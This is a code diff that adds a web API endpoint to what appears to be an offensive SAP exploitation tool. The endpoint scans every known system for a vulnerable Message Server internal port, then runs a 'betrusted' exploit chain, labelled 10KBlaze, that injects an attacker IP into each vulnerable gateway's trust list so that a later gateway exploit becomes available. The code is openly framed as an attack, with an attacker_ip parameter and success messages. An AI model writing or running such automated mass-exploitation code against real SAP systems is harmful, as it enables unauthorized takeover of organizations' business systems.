@@ -2644,6 +2644,54 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg("_check_all_ms", "Check All MS Betrusted", _run)
         return json.dumps({"status": "started", "systems": len(nodes)})
 
+    @app.route("/api/actions/check_all_betrusted", method="POST")
+    def actions_check_all_betrusted():
+        """Check MS betrusted + inject trusted IP on all nodes."""
+        response.content_type = "application/json"
+        data = request.json or {}
+        attacker_ip = data.get("attacker_ip", "").strip()
+        nodes = list(api.state.nodes.values())
+
+        def _run():
+            # Phase 1: scan all MS ports
+            print(f"[*] Phase 1: Scanning MS internal ports on {len(nodes)} systems...")
+            vulnerable = []
+            for node in nodes:
+                if node.ms_vulnerable:
+                    print(f"[+] {node.sid}: Already known MS vulnerable (port {node.ms_port})")
+                    vulnerable.append(node)
+                    continue
+                print(f"[*] {node.sid}: Checking MS internal port...")
+                sapmap_scanner.check_ms_betrusted(node)
+                if node.ms_vulnerable:
+                    print(f"[+] {node.sid}: MS port {node.ms_port} VULNERABLE!")
+                    vulnerable.append(node)
+
+            if not vulnerable:
+                print(f"[-] No systems with vulnerable MS internal port found")
+                return
+
+            # Phase 2: inject trusted IP on vulnerable systems
+            print(f"\n[*] Phase 2: Injecting trusted IP on {len(vulnerable)} vulnerable systems...")
+            for node in vulnerable:
+                print(f"[*] {node.sid}: betrusted → inject {attacker_ip or 'auto-detect'}")
+                ok = sapmap_exploit.try_betrusted_chain(
+                    node, api.state,
+                    attacker_ip=attacker_ip,
+                    nilist_wait=30,
+                )
+                if ok:
+                    print(f"[+] {node.sid}: Gateway TRUSTED — GW exploit available!")
+                else:
+                    print(f"[-] {node.sid}: betrusted did not establish trust")
+
+            trusted = [n for n in vulnerable if n.gw_vulnerable]
+            print(f"\n[*] Results: {len(vulnerable)} MS vulnerable, "
+                  f"{len(trusted)} gateway trusted")
+
+        _bg("_check_all_betrusted", "Check All 10KBlaze", _run)
+        return json.dumps({"status": "started", "systems": len(nodes)})
+
     @app.route("/api/actions/reset_rfc_cache", method="POST")
     def actions_reset_rfc_cache():
         response.content_type = "application/json"
